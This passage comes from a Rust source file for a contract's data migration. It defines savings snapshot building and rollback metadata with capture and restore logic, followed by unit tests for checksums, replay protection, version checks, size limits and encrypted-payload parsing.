///   serialised bytes **after** calling this function and wrapping them via
///   [`export_to_encrypted_payload`].
pub fn build_savings_snapshot(
    goals_export: SavingsGoalsExport,
    format: ExportFormat,
) -> ExportSnapshot {
    let payload = SnapshotPayload::SavingsGoals(goals_export);
    ExportSnapshot::new(payload, format)
}

/// Rollback metadata (for migration scripts to record last good state).
///
/// This struct captures enough pre-import information for an operator to
/// deterministically return the contract to the exact pre-import state if an
/// import fails partway through. The recovery contract is:
///
/// - `capture` MUST be called *before* any irreversible operation occurs
///   (validation-only operations are OK) so that the previous state is
///   snapshotted deterministically.
/// - `restore` MUST restore the captured `previous_snapshot` (if present),
///   and must also remove any replay-tracking entry for the failed
///   `attempted_snapshot` so the operator can safely retry the import.
/// - `restore` MUST be idempotent: calling it multiple times is a no-op after
///   the first successful restore.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RollbackMetadata {
    /// The full previous snapshot (if any). `None` indicates the contract had
    /// no snapshot / empty state prior to the attempted import.
    pub previous_snapshot: Option<ExportSnapshot>,

    /// The schema version of the previous snapshot, or `0` if none.
    pub previous_version: u32,

    /// The checksum of the previous snapshot, or empty string if none.
    pub previous_checksum: String,

    /// Timestamp when the capture occurred (ms since epoch). This is an
    /// operator-facing field for auditing/recovery logging.
    pub timestamp_ms: u64,

    /// Identity of the attempted import that triggered this capture. Used by
    /// `restore` to remove any replay-tracking entry created for the failed
    /// import so retries are permitted.
    pub attempted_checksum: String,
    pub attempted_version: u32,
}

impl RollbackMetadata {
    /// Capture rollback metadata from the current on-chain state and the
    /// snapshot that will be attempted for import. This must be invoked
    /// *before* any irreversible mutation occurs.
    pub fn capture(
        current_state: Option<&ExportSnapshot>,
        attempted_snapshot: &ExportSnapshot,
        timestamp_ms: u64,
    ) -> Self {
        let (prev_snapshot, prev_version, prev_checksum) = if let Some(s) = current_state {
            (Some(s.clone()), s.header.version, s.header.checksum.clone())
        } else {
            (None, 0u32, String::new())
        };

        RollbackMetadata {
            previous_snapshot: prev_snapshot,
            previous_version: prev_version,
            previous_checksum: prev_checksum,
            timestamp_ms,
            attempted_checksum: attempted_snapshot.header.checksum.clone(),
            attempted_version: attempted_snapshot.header.version,
        }
    }

    /// Restore the captured pre-import state into `state` and reconcile the
    /// `tracker` so replay protection remains sound.
    ///
    /// Behaviour:
    /// - If `previous_snapshot` is `Some`, set `state` to that snapshot.
    /// - Otherwise set `state` to `None` (empty state).
    /// - Remove the replay-tracking entry for the attempted snapshot so the
    ///   operator may safely retry the import. This operation is idempotent.
    pub fn restore(
        &self,
        state: &mut Option<ExportSnapshot>,
        tracker: &mut MigrationTracker,
    ) -> Result<(), MigrationError> {
        // Revert the on-chain state representation.
        *state = self.previous_snapshot.clone();

        // Ensure the attempted import's replay marker is removed so retries
        // are possible. `unmark_imported` is idempotent.
        if self.attempted_checksum.is_empty() && self.attempted_version == 0 {
            // Nothing to unmark.
            return Ok(());
        }

        tracker.unmark_imported_by_identity(&self.attempted_checksum, self.attempted_version);
        Ok(())
    }
}

// Minimal hex encoder used by compute_checksum.
mod hex {
    const HEX: &[u8] = b"0123456789abcdef";

    pub fn encode(bytes: &[u8]) -> String {
        let mut s = String::with_capacity(bytes.len() * 2);
        for &byte in bytes {
            s.push(HEX[(byte >> 4) as usize] as char);
            s.push(HEX[(byte & 0x0f) as usize] as char);
        }
        s
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_goal(id: u32) -> SavingsGoalExport {
        SavingsGoalExport {
            id,
            owner: "G1".into(),
            name: format!("Goal {id}"),
            target_amount: 1_000,
            current_amount: 100,
            target_date: 2_000_000_000,
            locked: false,
        }
    }

    fn sample_goals_export(count: usize) -> SavingsGoalsExport {
        SavingsGoalsExport {
            next_id: count as u32,
            goals: (1..=count as u32).map(sample_goal).collect(),
        }
    }

    fn sample_remittance_payload() -> SnapshotPayload {
        SnapshotPayload::RemittanceSplit(RemittanceSplitExport {
            owner: "GABC".into(),
            spending_percent: 50,
            savings_percent: 30,
            bills_percent: 15,
            insurance_percent: 5,
        })
    }

    fn sample_savings_payload() -> SnapshotPayload {
        SnapshotPayload::SavingsGoals(SavingsGoalsExport {
            next_id: 2,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "GOWNER".into(),
                name: "Emergency Fund".into(),
                target_amount: 5_000,
                current_amount: 1_000,
                target_date: 2_000_000_000,
                locked: false,
            }],
        })
    }

    fn sample_generic_payload() -> SnapshotPayload {
        let mut entries = HashMap::new();
        entries.insert("key1".into(), serde_json::json!("value1").into());
        entries.insert("key2".into(), serde_json::json!(42).into());
        SnapshotPayload::Generic(entries)
    }

    #[test]
    fn test_snapshot_checksum_roundtrip_succeeds() {
        let snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        assert!(snapshot.verify_checksum());
        assert!(snapshot.is_version_compatible());
        assert!(snapshot.validate_for_import().is_ok());
    }

    #[test]
    fn test_export_import_json_succeeds() {
        let snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let bytes = export_to_json(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let loaded = import_from_json(&bytes, &mut tracker, 123_456).unwrap();
        assert_eq!(loaded.header.version, SCHEMA_VERSION);
        assert!(loaded.verify_checksum());
        assert_eq!(loaded.header.hash_algorithm, ChecksumAlgorithm::Sha256);
    }

    #[test]
    fn test_export_import_binary_succeeds() {
        let snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        let bytes = export_to_binary(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let loaded = import_from_binary(&bytes, &mut tracker, 123_456).unwrap();
        assert!(loaded.verify_checksum());
        assert_eq!(loaded.header.hash_algorithm, ChecksumAlgorithm::Sha256);
    }

    #[test]
    fn test_import_replay_protection_prevents_duplicates() {
        let snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let bytes = export_to_json(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        let loaded = import_from_json(&bytes, &mut tracker, 1_000).unwrap();
        assert!(tracker.is_imported(&loaded));

        let result = import_from_json(&bytes, &mut tracker, 2_000);
        assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
    }

    #[test]
    fn test_replay_protection_savings_goals_json_duplicate_rejected() {
        let snapshot = ExportSnapshot::new(sample_savings_payload(), ExportFormat::Json);
        let bytes = export_to_json(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        import_from_json(&bytes, &mut tracker, 1_000).unwrap();

        let result = import_from_json(&bytes, &mut tracker, 2_000);
        assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
    }

    #[test]
    fn test_replay_protection_generic_payload_json_duplicate_rejected() {
        let snapshot = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json);
        let bytes = export_to_json(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        import_from_json(&bytes, &mut tracker, 1_000).unwrap();

        let result = import_from_json(&bytes, &mut tracker, 2_000);
        assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
    }

    #[test]
    fn test_replay_protection_cross_payload_types_independent() {
        let snapshots = [
            ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json),
            ExportSnapshot::new(sample_savings_payload(), ExportFormat::Json),
            ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json),
        ];
        let mut tracker = MigrationTracker::new();

        for (index, snapshot) in snapshots.iter().enumerate() {
            let bytes = export_to_json(snapshot).unwrap();
            import_from_json(&bytes, &mut tracker, (index as u64 + 1) * 1_000).unwrap();
        }

        for snapshot in snapshots {
            let bytes = export_to_json(&snapshot).unwrap();
            let result = import_from_json(&bytes, &mut tracker, 9_999);
            assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
        }
    }

    #[test]
    fn test_replay_protection_savings_goals_binary_duplicate_rejected() {
        let snapshot = ExportSnapshot::new(sample_savings_payload(), ExportFormat::Binary);
        let bytes = export_to_binary(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        import_from_binary(&bytes, &mut tracker, 1_000).unwrap();

        let result = import_from_binary(&bytes, &mut tracker, 2_000);
        assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
    }

    #[test]
    fn test_replay_protection_generic_payload_binary_duplicate_rejected() {
        let snapshot = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Binary);
        let _bytes = export_to_binary(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        tracker.mark_imported(&snapshot, 1_000).unwrap();

        let result = tracker.mark_imported(&snapshot, 2_000);
        assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
    }

    #[test]
    fn test_same_payload_type_different_content_no_collision() {
        let first_snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let second_snapshot = ExportSnapshot::new(
            SnapshotPayload::RemittanceSplit(RemittanceSplitExport {
                owner: "GABC".into(),
                spending_percent: 45,
                savings_percent: 35,
                bills_percent: 15,
                insurance_percent: 5,
            }),
            ExportFormat::Json,
        );
        let first_bytes = export_to_json(&first_snapshot).unwrap();
        let second_bytes = export_to_json(&second_snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        assert_ne!(
            first_snapshot.header.checksum,
            second_snapshot.header.checksum
        );

        import_from_json(&first_bytes, &mut tracker, 1_000).unwrap();
        import_from_json(&second_bytes, &mut tracker, 2_000).unwrap();
    }

    #[test]
    fn test_different_payload_same_size_no_collision() {
        let first_payload = SnapshotPayload::Generic(HashMap::from([
            ("aa".into(), serde_json::json!("11").into()),
            ("bb".into(), serde_json::json!("22").into()),
        ]));
        let second_payload = SnapshotPayload::Generic(HashMap::from([
            ("cc".into(), serde_json::json!("33").into()),
            ("dd".into(), serde_json::json!("44").into()),
        ]));
        let first_snapshot = ExportSnapshot::new(first_payload, ExportFormat::Json);
        let second_snapshot = ExportSnapshot::new(second_payload, ExportFormat::Json);
        let first_bytes = export_to_json(&first_snapshot).unwrap();
        let second_bytes = export_to_json(&second_snapshot).unwrap();
        let mut tracker = MigrationTracker::new();

        assert_eq!(
            canonical_payload_bytes(&first_snapshot.payload)
                .unwrap()
                .len(),
            canonical_payload_bytes(&second_snapshot.payload)
                .unwrap()
                .len()
        );
        assert_ne!(
            first_snapshot.header.checksum,
            second_snapshot.header.checksum
        );

        import_from_json(&first_bytes, &mut tracker, 1_000).unwrap();
        import_from_json(&second_bytes, &mut tracker, 2_000).unwrap();
    }

    #[test]
    fn test_tracker_is_imported_reflects_state_across_types() {
        let snapshots = [
            ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json),
            ExportSnapshot::new(sample_savings_payload(), ExportFormat::Json),
            ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json),
        ];
        let mut tracker = MigrationTracker::new();

        for (index, snapshot) in snapshots.iter().enumerate() {
            assert!(!tracker.is_imported(snapshot));

            let bytes = export_to_json(snapshot).unwrap();
            let loaded =
                import_from_json(&bytes, &mut tracker, (index as u64 + 1) * 1_000).unwrap();

            assert!(tracker.is_imported(snapshot));
            assert!(tracker.is_imported(&loaded));
        }
    }

    #[test]
    fn test_tracker_mark_imported_rejects_exact_duplicate() {
        let snapshot = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json);
        let mut tracker = MigrationTracker::new();

        tracker.mark_imported(&snapshot, 1_000).unwrap();

        let result = tracker.mark_imported(&snapshot, 2_000);
        assert_eq!(result.unwrap_err(), MigrationError::DuplicateImport);
    }

    #[test]
    fn test_tracker_mark_imported_allows_different_version_same_checksum() {
        let mut first_snapshot = ExportSnapshot::new(sample_savings_payload(), ExportFormat::Json);
        let mut second_snapshot = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json);
        let mut tracker = MigrationTracker::new();

        first_snapshot.header.checksum = "shared-checksum".into();
        second_snapshot.header.checksum = "shared-checksum".into();
        second_snapshot.header.version = first_snapshot.header.version + 1;

        tracker.mark_imported(&first_snapshot, 1_000).unwrap();
        tracker.mark_imported(&second_snapshot, 2_000).unwrap();

        assert!(tracker.is_imported(&first_snapshot));
        assert!(tracker.is_imported(&second_snapshot));
    }

    #[test]
    fn test_checksum_mismatch_import_fails() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.checksum = "wrong".into();
        assert_eq!(
            snapshot.validate_for_import(),
            Err(MigrationError::ChecksumMismatch)
        );
    }

    #[test]
    fn test_algorithm_field_roundtrips_json() {
        let snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let bytes = export_to_json(&snapshot).unwrap();
        let loaded = import_from_json_untracked(&bytes).unwrap();
        assert_eq!(loaded.header.hash_algorithm, ChecksumAlgorithm::Sha256);
    }

    #[test]
    fn test_algorithm_field_roundtrips_binary() {
        let snapshot = ExportSnapshot::new(sample_savings_payload(), ExportFormat::Binary);
        let bytes = export_to_binary(&snapshot).unwrap();
        let loaded = import_from_binary_untracked(&bytes).unwrap();
        assert_eq!(loaded.header.hash_algorithm, ChecksumAlgorithm::Sha256);
    }

    #[test]
    fn test_legacy_simple_checksum_import_succeeds() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.hash_algorithm = ChecksumAlgorithm::Simple;
        snapshot.header.checksum = snapshot.compute_simple_checksum().unwrap();

        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let loaded = import_from_json_untracked(&bytes).unwrap();
        assert_eq!(loaded.header.hash_algorithm, ChecksumAlgorithm::Simple);
        assert!(loaded.verify_checksum());
    }

    #[test]
    fn test_missing_hash_algorithm_field_defaults_to_legacy_simple() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.checksum = snapshot.compute_simple_checksum().unwrap();
        snapshot.header.hash_algorithm = ChecksumAlgorithm::Simple;

        let mut bytes: serde_json::Value =
            serde_json::from_slice(&serde_json::to_vec(&snapshot).unwrap()).unwrap();
        bytes
            .as_object_mut()
            .and_then(|obj| obj.get_mut("header"))
            .and_then(|header| header.as_object_mut())
            .and_then(|header_obj| header_obj.remove("hash_algorithm"));
        let serialized = serde_json::to_vec(&bytes).unwrap();

        let loaded = import_from_json_untracked(&serialized).unwrap();
        assert_eq!(loaded.header.hash_algorithm, ChecksumAlgorithm::Simple);
        assert!(loaded.verify_checksum());
    }

    #[test]
    fn test_check_version_compatibility_succeeds() {
        assert!(check_version_compatibility(1).is_ok());
        assert!(check_version_compatibility(SCHEMA_VERSION).is_ok());
        assert!(check_version_compatibility(0).is_err());
        assert!(check_version_compatibility(SCHEMA_VERSION + 1).is_err());
    }

    #[test]
    fn test_migration_event_serialization_succeeds() {
        let event = MigrationEvent::V1(MigrationEventV1 {
            contract_id: "CABCD".into(),
            migration_type: "export".into(),
            version: SCHEMA_VERSION,
            timestamp_ms: 123_456_789,
        });

        let json = serde_json::to_string(&event).unwrap();
        let loaded: MigrationEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(event, loaded);
    }

    #[test]
    fn test_csv_export_import_goals_succeeds() {
        let export = SavingsGoalsExport {
            next_id: 2,
            goals: vec![SavingsGoalExport {
                locked: true,
                current_amount: 500,
                ..sample_goal(1)
            }],
        };

        let csv_bytes = export_to_csv(&export).unwrap();
        let goals = import_goals_from_csv(&csv_bytes).unwrap();
        assert_eq!(goals.len(), 1);
        assert_eq!(goals[0].name, "Goal 1");
        assert!(goals[0].locked);
    }

    #[test]
    fn test_export_rejects_payload_larger_than_limit() {
        let mut entries = HashMap::new();
        entries.insert(
            "blob".into(),
            serde_json::Value::String("x".repeat(MAX_MIGRATION_PAYLOAD_BYTES)).into(),
        );
        let snapshot = ExportSnapshot::new(SnapshotPayload::Generic(entries), ExportFormat::Json);

        assert!(matches!(
            export_to_json(&snapshot),
            Err(MigrationError::PayloadTooLarge { .. })
        ));
    }

    #[test]
    fn test_export_binary_rejects_too_many_records() {
        let payload = SnapshotPayload::SavingsGoals(sample_goals_export(MAX_MIGRATION_RECORDS + 1));
        let snapshot = ExportSnapshot::new(payload, ExportFormat::Binary);

        assert_eq!(
            export_to_binary(&snapshot),
            Err(MigrationError::TooManyRecords {
                count: MAX_MIGRATION_RECORDS + 1,
                max: MAX_MIGRATION_RECORDS,
            })
        );
    }

    #[test]
    fn test_import_json_rejects_oversized_snapshot_before_deserialize() {
        let oversized = vec![b' '; MAX_MIGRATION_SNAPSHOT_BYTES + 1];

        assert!(matches!(
            import_from_json_untracked(&oversized),
            Err(MigrationError::SnapshotTooLarge {
                size,
                max: MAX_MIGRATION_SNAPSHOT_BYTES,
            }) if size == MAX_MIGRATION_SNAPSHOT_BYTES + 1
        ));
    }

    #[test]
    fn test_import_binary_rejects_oversized_snapshot_before_deserialize() {
        let oversized = vec![0u8; MAX_MIGRATION_SNAPSHOT_BYTES + 1];

        assert!(matches!(
            import_from_binary_untracked(&oversized),
            Err(MigrationError::SnapshotTooLarge {
                size,
                max: MAX_MIGRATION_SNAPSHOT_BYTES,
            }) if size == MAX_MIGRATION_SNAPSHOT_BYTES + 1
        ));
    }

    #[test]
    fn test_csv_import_rejects_too_many_records() {
        let export = sample_goals_export(MAX_MIGRATION_RECORDS + 1);
        let mut csv =
            String::from("id,owner,name,target_amount,current_amount,target_date,locked\n");
        for goal in export.goals {
            csv.push_str(&format!(
                "{},{},{},{},{},{},{}\n",
                goal.id,
                goal.owner,
                goal.name,
                goal.target_amount,
                goal.current_amount,
                goal.target_date,
                goal.locked
            ));
        }

        assert!(matches!(
            import_goals_from_csv(csv.as_bytes()),
            Err(MigrationError::TooManyRecords {
                count,
                max,
            }) if count == MAX_MIGRATION_RECORDS + 1 && max == MAX_MIGRATION_RECORDS
        ));
    }

    #[test]
    fn test_encrypted_payload_roundtrip_at_size_limit_succeeds() {
        let plain = vec![42u8; MAX_MIGRATION_PAYLOAD_BYTES];
        let encoded = export_to_encrypted_payload(&plain).unwrap();
        assert_eq!(encoded.len(), MAX_ENCRYPTED_PAYLOAD_BYTES);
        assert_eq!(import_from_encrypted_payload(&encoded).unwrap(), plain);
    }

    #[test]
    fn test_encrypted_payload_missing_marker_fails() {
        let encoded = base64::engine::general_purpose::STANDARD.encode(b"abc");
        let err = import_from_encrypted_payload(&encoded).unwrap_err();
        assert!(matches!(err, MigrationError::InvalidFormat(_)));
    }

    #[test]
    fn test_encrypted_payload_unsupported_version_marker_fails() {
        let encoded = format!(
            "enc:v2:{}",
            base64::engine::general_purpose::STANDARD.encode(b"abc")
        );
        let err = import_from_encrypted_payload(&encoded).unwrap_err();
        assert!(matches!(err, MigrationError::InvalidFormat(_)));
    }

    #[test]
    fn test_encrypted_payload_empty_ciphertext_fails() {
        let err = import_from_encrypted_payload("enc:v1:").unwrap_err();
        assert!(matches!(err, MigrationError::InvalidFormat(_)));
    }

    #[test]
    fn test_encrypted_payload_invalid_base64_fails() {
        let err = import_from_encrypted_payload("enc:v1:!!!not-base64!!!").unwrap_err();
        assert!(matches!(err, MigrationError::InvalidFormat(_)));
    }

    #[test]
    fn test_import_from_encrypted_payload_rejects_oversized_input() {
        let oversized = format!(
            "{}{}",
            ENCRYPTED_PAYLOAD_PREFIX_V1,
            "A".repeat(MAX_ENCRYPTED_PAYLOAD_BYTES)
        );

        assert_eq!(
            import_from_encrypted_payload(&oversized),
            Err(MigrationError::PayloadTooLarge {
                size: oversized.len(),
                max: MAX_ENCRYPTED_PAYLOAD_BYTES,
            })
        );
    }

    #[test]
    fn test_encrypted_payload_empty_string_fails() {
        let result = import_from_encrypted_payload("");
        assert!(matches!(result, Err(MigrationError::InvalidFormat(_))));
    }

    #[test]
    fn test_encrypted_payload_partial_marker_fails() {
        for partial in &["enc:", "enc:v1", "enc:v"] {
            let result = import_from_encrypted_payload(partial);
            assert!(
                matches!(result, Err(MigrationError::InvalidFormat(_))),
                "expected InvalidFormat for partial marker {:?}",
                partial
            );
        }
    }

    #[test]
    fn test_encrypted_payload_wrong_case_marker_fails() {
        let valid_b64 = base64::engine::general_purpose::STANDARD.encode(b"test");
        for prefix in &["ENC:V1:", "Enc:V1:"] {
            let input = format!("{}{}", prefix, valid_b64);
            let result = import_from_encrypted_payload(&input);
            assert!(
                matches!(result, Err(MigrationError::InvalidFormat(_))),
                "expected InvalidFormat for wrong-case marker {:?}",
                prefix
            );
        }
    }

    #[test]
    fn test_encrypted_payload_whitespace_input_fails() {
        for input in &[" ", "\t", " enc:v1:dGVzdA== "] {
            let result = import_from_encrypted_payload(input);
            assert!(
                matches!(result, Err(MigrationError::InvalidFormat(_))),
                "expected InvalidFormat for whitespace input {:?}",
                input
            );
        }
    }

    #[test]
    fn test_encrypted_payload_post_decode_too_large_fails() {
        let plain = vec![42u8; MAX_MIGRATION_PAYLOAD_BYTES + 1];
        let b64 = base64::engine::general_purpose::STANDARD.encode(&plain);
        let encoded = format!("{}{}", ENCRYPTED_PAYLOAD_PREFIX_V1, b64);
        // Verify pre-decode guard won't fire first
        assert!(
            encoded.len() <= MAX_ENCRYPTED_PAYLOAD_BYTES,
            "encoded len {} exceeds MAX_ENCRYPTED_PAYLOAD_BYTES {}",
            encoded.len(),
            MAX_ENCRYPTED_PAYLOAD_BYTES
        );
        let result = import_from_encrypted_payload(&encoded);
        assert!(
            matches!(result, Err(MigrationError::PayloadTooLarge { size, max })
                if size == MAX_MIGRATION_PAYLOAD_BYTES + 1 && max == MAX_MIGRATION_PAYLOAD_BYTES),
            "expected PayloadTooLarge {{ size: {}, max: {} }}, got {:?}",
            MAX_MIGRATION_PAYLOAD_BYTES + 1,
            MAX_MIGRATION_PAYLOAD_BYTES,
            result
        );
    }

    #[test]
    fn test_encrypted_payload_pre_decode_boundary_plus_one_fails() {
        let oversized = "A".repeat(MAX_ENCRYPTED_PAYLOAD_BYTES + 1);
        let result = import_from_encrypted_payload(&oversized);
        assert!(
            matches!(result, Err(MigrationError::PayloadTooLarge { size, max })
                if size == MAX_ENCRYPTED_PAYLOAD_BYTES + 1 && max == MAX_ENCRYPTED_PAYLOAD_BYTES),
            "expected PayloadTooLarge {{ size: {}, max: {} }}, got {:?}",
            MAX_ENCRYPTED_PAYLOAD_BYTES + 1,
            MAX_ENCRYPTED_PAYLOAD_BYTES,
            result
        );
    }

    #[test]
    fn test_encrypted_payload_exact_boundary_accepted() {
        let plain = vec![42u8; MAX_MIGRATION_PAYLOAD_BYTES];
        let encoded = export_to_encrypted_payload(&plain).unwrap();
        assert_eq!(
            encoded.len(),
            MAX_ENCRYPTED_PAYLOAD_BYTES,
            "encoded length {} != MAX_ENCRYPTED_PAYLOAD_BYTES {}",
            encoded.len(),
            MAX_ENCRYPTED_PAYLOAD_BYTES
        );
        let result = import_from_encrypted_payload(&encoded);
        assert!(
            result.is_ok(),
            "expected Ok(_) at exact boundary, got {:?}",
            result
        );
        assert_eq!(result.unwrap(), plain);
    }

    fn assert_snapshot_equal(a: &Option<ExportSnapshot>, b: &Option<ExportSnapshot>) {
        match (a, b) {
            (None, None) => return,
            (Some(_), None) | (None, Some(_)) => panic!("snapshot mismatch: one is None"),
            (Some(a_snap), Some(b_snap)) => {
                assert_eq!(a_snap.header.version, b_snap.header.version);
                assert_eq!(a_snap.header.checksum, b_snap.header.checksum);
                let a_bytes = canonical_payload_bytes(&a_snap.payload).unwrap();
                let b_bytes = canonical_payload_bytes(&b_snap.payload).unwrap();
                assert_eq!(a_bytes, b_bytes);
            }
        }
    }

    #[test]
    fn test_failed_import_restores_state_exactly() {
        // Prepare previous state and attempted snapshot
        let prev = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let attempted = ExportSnapshot::new(sample_savings_payload(), ExportFormat::Json);

        // Simulated on-chain state and tracker
        let mut state: Option<ExportSnapshot> = Some(prev.clone());
        let mut tracker = MigrationTracker::new();

        // Simulate that previous snapshot was already imported earlier
        tracker.mark_imported(&prev, 1_000).unwrap();

        // Capture rollback metadata BEFORE attempting import
        let rb = RollbackMetadata::capture(state.as_ref(), &attempted, 2_000);

        // Begin import: we simulate a partial apply that sets state and marks tracker
        state = Some(attempted.clone());
        tracker.mark_imported(&attempted, 2_001).unwrap();

        // Now a downstream validation fails and we must restore
        rb.restore(&mut state, &mut tracker).unwrap();

        // State should equal previous snapshot
        assert_snapshot_equal(&state, &Some(prev.clone()));

        // The attempted snapshot must no longer be marked as imported
        assert!(!tracker.is_imported(&attempted));

        // The original previous import marker remains intact
        assert!(tracker.is_imported(&prev));
    }

    #[test]
    fn test_successful_import_discards_rollback_metadata() {
        let prev: Option<ExportSnapshot> = None;
        let attempted = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json);

        let mut state: Option<ExportSnapshot> = prev.clone();
        let mut tracker = MigrationTracker::new();

        // Capture before import
        let rb = RollbackMetadata::capture(state.as_ref(), &attempted, 1_000);

        // Successful import: apply state and mark imported
        state = Some(attempted.clone());
        tracker.mark_imported(&attempted, 1_001).unwrap();

        // Operator discards rollback metadata on success; attempting to restore
        // after successful completion should be a no-op (we consider metadata
        // discarded by convention). For the purpose of the test we simply drop
        // the metadata and assert state remains the imported snapshot.
        drop(rb);
        assert_snapshot_equal(&state, &Some(attempted.clone()));
        assert!(tracker.is_imported(&attempted));
    }

    #[test]
    fn test_double_rollback_is_idempotent() {
        let prev = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let attempted = ExportSnapshot::new(sample_savings_payload(), ExportFormat::Json);

        let mut state: Option<ExportSnapshot> = Some(prev.clone());
        let mut tracker = MigrationTracker::new();

        let rb = RollbackMetadata::capture(state.as_ref(), &attempted, 5_000);

        // Simulate partial apply
        state = Some(attempted.clone());
        tracker.mark_imported(&attempted, 6_000).unwrap();

        // First restore
        rb.restore(&mut state, &mut tracker).unwrap();
        assert_snapshot_equal(&state, &Some(prev.clone()));
        assert!(!tracker.is_imported(&attempted));

        // Second restore should be a no-op and not panic
        rb.restore(&mut state, &mut tracker).unwrap();
        assert_snapshot_equal(&state, &Some(prev.clone()));
        assert!(!tracker.is_imported(&attempted));
    }

    #[test]
    fn test_generic_payload_checksum_is_stable_across_map_order() {
        let mut first = HashMap::new();
        first.insert("b".into(), serde_json::json!(2).into());
        first.insert("a".into(), serde_json::json!(1).into());

        let mut second = HashMap::new();
        second.insert("a".into(), serde_json::json!(1).into());
        second.insert("b".into(), serde_json::json!(2).into());

        let first_snapshot =
            ExportSnapshot::new(SnapshotPayload::Generic(first), ExportFormat::Json);
        let second_snapshot =
            ExportSnapshot::new(SnapshotPayload::Generic(second), ExportFormat::Json);

        assert_eq!(
            first_snapshot.compute_checksum().unwrap(),
            second_snapshot.compute_checksum().unwrap()
        );
    }

    #[test]
    fn test_error_display_messages() {
        assert!(MigrationError::ChecksumMismatch
            .to_string()
            .contains("checksum mismatch"));
        assert!(MigrationError::UnknownHashAlgorithm
            .to_string()
            .contains("unknown hash algorithm"));
        assert!(MigrationError::IncompatibleVersion {
            found: 5,
            min: 1,
            max: 2,
        }
        .to_string()
        .contains("5"));
    }

    // --- import_from_json_untracked / import_from_binary_untracked guard tests ---
    // These tests verify that the "untracked" helpers enforce the full validation
    // contract (checksum, version compatibility) even without a persistent tracker.

    #[test]
    fn test_import_from_json_untracked_rejects_bad_checksum() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.checksum = "deadbeef".into();
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        assert_eq!(
            import_from_json_untracked(&bytes).unwrap_err(),
            MigrationError::ChecksumMismatch
        );
    }

    #[test]
    fn test_import_from_binary_untracked_rejects_bad_checksum() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.checksum = "deadbeef".into();
        let bytes = bincode::serialize(&snapshot).unwrap();
        assert_eq!(
            import_from_binary_untracked(&bytes).unwrap_err(),
            MigrationError::ChecksumMismatch
        );
    }

    #[test]
    fn test_import_from_json_untracked_rejects_future_version() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.version = SCHEMA_VERSION + 1;
        // Recompute checksum so the version-check fires, not the checksum-check.
        snapshot.header.checksum = snapshot.compute_checksum().unwrap();
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        assert_eq!(
            import_from_json_untracked(&bytes).unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: SCHEMA_VERSION + 1,
                min: MIN_SUPPORTED_VERSION,
                max: SCHEMA_VERSION,
            }
        );
    }

    #[test]
    fn test_import_from_binary_untracked_rejects_future_version() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.version = SCHEMA_VERSION + 1;
        snapshot.header.checksum = snapshot.compute_checksum().unwrap();
        let bytes = bincode::serialize(&snapshot).unwrap();
        assert_eq!(
            import_from_binary_untracked(&bytes).unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: SCHEMA_VERSION + 1,
                min: MIN_SUPPORTED_VERSION,
                max: SCHEMA_VERSION,
            }
        );
    }

    #[test]
    fn test_import_from_json_untracked_rejects_below_min_version() {
        // MIN_SUPPORTED_VERSION is 1; use 0 as a below-minimum version.
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.version = MIN_SUPPORTED_VERSION.saturating_sub(1);
        snapshot.header.checksum = snapshot.compute_checksum().unwrap();
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        assert_eq!(
            import_from_json_untracked(&bytes).unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: MIN_SUPPORTED_VERSION.saturating_sub(1),
                min: MIN_SUPPORTED_VERSION,
                max: SCHEMA_VERSION,
            }
        );
    }

    #[test]
    fn test_import_from_binary_untracked_rejects_below_min_version() {
